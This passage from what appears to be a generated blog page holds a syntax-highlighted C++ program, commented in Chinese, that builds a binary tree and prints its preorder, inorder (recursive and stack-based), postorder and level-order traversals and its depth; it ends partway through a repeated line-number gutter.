class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> STACK_INIT_SIZE 100<span class=\"comment\">//存储空间初始分配量</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> STACKINCREMENT 10<span class=\"comment\">//存储空间分配增量</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BiTNode</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> data;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BiTNode</span>* <span class=\"title\">lchild</span>, * <span class=\"title\">rchild</span>;</span></span><br><span class=\"line\">&#125;BiTNode,* BiTree;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tBiTNode* treeNode;</span><br><span class=\"line\">\tNode* next;</span><br><span class=\"line\">&#125;Node;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">LinkQueue</span> &#123;</span></span><br><span class=\"line\">\tNode* front;</span><br><span class=\"line\">\tNode* rear;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;LinkQueue;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\tBiTNode* top;</span><br><span class=\"line\">\tBiTNode* base;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;stack;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">createBiTree</span><span class=\"params\">(BiTree&amp; t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrderTraverse</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse1</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">postOrderTraverse</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getDeep</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">initQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">enQueue</span><span class=\"params\">(LinkQueue&amp; Q, BiTNode treeNode)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">deQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">floorTraverse</span><span class=\"params\">(LinkQueue&amp; Q, BiTree&amp; t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse2</span><span class=\"params\">(stack s, BiTree&amp; t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initStack</span><span class=\"params\">(stack&amp; s)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">isEmpty</span><span class=\"params\">(stack&amp; s)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(stack&amp; s, BiTNode treeNode)</span></span>;</span><br><span class=\"line\"><span class=\"function\">BiTNode <span class=\"title\">pop</span><span class=\"params\">(stack&amp; s)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\tBiTree t;</span><br><span class=\"line\">\tstack s;</span><br><span class=\"line\">\t<span class=\"built_in\">initStack</span>(s);</span><br><span class=\"line\">\tLinkQueue Q;</span><br><span class=\"line\">\t<span class=\"built_in\">initQueue</span>(Q);</span><br><span class=\"line\">\t<span class=\"built_in\">createBiTree</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;二叉树创建完成&quot;</span> &lt;&lt; endl&lt;&lt;endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;先序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">preOrderTraverse</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;递归中序遍历&quot;</span> &lt;&lt;endl;</span><br><span class=\"line\">\t<span class=\"built_in\">inOrderTraverse1</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;非递归中序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">inOrderTraverse2</span>(s, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;后序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">postOrderTraverse</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;层序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">floorTraverse</span>(Q, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;二叉树的深度为&quot;</span> &lt;&lt; <span class=\"built_in\">getDeep</span>(t) &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">createBiTree</span><span class=\"params\">(BiTree&amp; t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> c;</span><br><span class=\"line\">\tcin &gt;&gt; c;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (c == <span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"comment\">//利用给先序遍历序列添加空节点保证建立二叉树的唯一性</span></span><br><span class=\"line\">\t\tt = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!(t = (BiTNode*)<span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BiTNode)))) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//申请该节点的内存空间</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//按照先序序列创建二叉树</span></span><br><span class=\"line\">\t\tt-&gt;data = c;</span><br><span class=\"line\">\t\t<span class=\"built_in\">createBiTree</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"built_in\">createBiTree</span>(t-&gt;rchild);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//先序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrderTraverse</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t) &#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; t-&gt;data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t<span class=\"built_in\">preOrderTraverse</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"built_in\">preOrderTraverse</span>(t-&gt;rchild);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//中序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse1</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">inOrderTraverse1</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\tcout &lt;&lt; t-&gt;data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t<span class=\"built_in\">inOrderTraverse1</span>(t-&gt;rchild);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//后序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">postOrderTraverse</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">postOrderTraverse</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"built_in\">postOrderTraverse</span>(t-&gt;rchild);</span><br><span class=\"line\">\t\tcout &lt;&lt; t-&gt;data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getDeep</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"built_in\">getDeep</span>(t-&gt;lchild);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b = <span class=\"built_in\">getDeep</span>(t-&gt;rchild);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (a &gt; b) ? (a + <span class=\"number\">1</span>) : (b + <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">initQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span> </span>&#123;</span><br><span class=\"line\">\tQ.front = Q.rear = <span class=\"keyword\">new</span> Node;</span><br><span class=\"line\">\t<span class=\"comment\">//这个链队列是具有头结点的链队列,头结点不存数据</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!Q.front) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tQ.front-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">enQueue</span><span class=\"params\">(LinkQueue&amp; Q, BiTNode *treeNode)</span> </span>&#123;</span><br><span class=\"line\">\tNode* p = (Node*)<span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(Node));</span><br><span class=\"line\">\t<span class=\"comment\">//如果内存申请失败</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!p) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//让p节点中的treeNode指向对应的树节点</span></span><br><span class=\"line\">\tp-&gt;treeNode =treeNode;</span><br><span class=\"line\">\tp-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//连接链表</span></span><br><span class=\"line\">\tQ.rear-&gt;next = p;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//头结点的data域为空,尾结点data域非空</span></span><br><span class=\"line\">\tQ.rear = p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">deQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Q.front &amp;&amp; Q.front != Q.rear) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//新建一个temp指针p</span></span><br><span class=\"line\">\t\tNode* p = Q.front-&gt;next;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tQ.front-&gt;next = p-&gt;next;</span><br><span class=\"line\">\t\t<span class=\"comment\">//判断出队的是不是最后一个节点</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//如果不加这个判断free(p后),Q.rear-&gt;next会变为野指针</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (p == Q.rear) &#123;</span><br><span class=\"line\">\t\t\tQ.rear = Q.front;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">floorTraverse</span><span class=\"params\">(LinkQueue&amp; Q, BiTree&amp; t)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">enQueue</span>(Q, t);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (Q.front != Q.rear) &#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; Q.front-&gt;next-&gt;treeNode-&gt;data &lt;&lt;<span class=\"string\">&#x27; &#x27;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Q.front-&gt;next-&gt;treeNode-&gt;lchild != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">enQueue</span>(Q, Q.front-&gt;next-&gt;treeNode-&gt;lchild);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Q.front-&gt;next-&gt;treeNode-&gt;rchild != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">enQueue</span>(Q, Q.front-&gt;next-&gt;treeNode-&gt;rchild);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">deQueue</span>(Q);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse2</span><span class=\"params\">(stack s,BiTree&amp; t)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBiTNode* p = t;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(p || !<span class=\"built_in\">isEmpty</span>(s)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (p) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">push</span>(s, *p);</span><br><span class=\"line\">\t\t\tp = p-&gt;lchild;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tBiTNode e = <span class=\"built_in\">pop</span>(s);</span><br><span class=\"line\">\t\t\tcout &lt;&lt; e.data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t\tp = e.rchild;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//栈相关函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initStack</span><span class=\"params\">(stack&amp; s)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//申请内存空间</span></span><br><span class=\"line\">\ts.base = (BiTNode*)<span class=\"built_in\">malloc</span>(STACK_INIT_SIZE * <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BiTNode));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!s.base) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts.top = s.base;</span><br><span class=\"line\">\ts.size = STACK_INIT_SIZE;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">isEmpty</span><span class=\"params\">(stack&amp; s)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (s.base == s.top)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(stack&amp; s, BiTNode treeNode)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (s.top - s.base &gt;= s.size) &#123;</span><br><span class=\"line\">\t\ts.base = (BiTNode*)<span class=\"built_in\">realloc</span>(s.base, (s.size + STACKINCREMENT) * <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BiTNode));</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!s.base) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ts.top = s.base + s.size;</span><br><span class=\"line\">\t\ts.size += STACKINCREMENT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*s.top++ = treeNode;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">BiTNode <span class=\"title\">pop</span><span class=\"params\">(stack&amp; s)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (s.base) &#123;\t</span><br><span class=\"line\">\t\tBiTNode e = (*--s.top);</span><br><span class=\"line\">\t\t(*s.top).data = <span class=\"string\">&#x27;$&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> e;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span 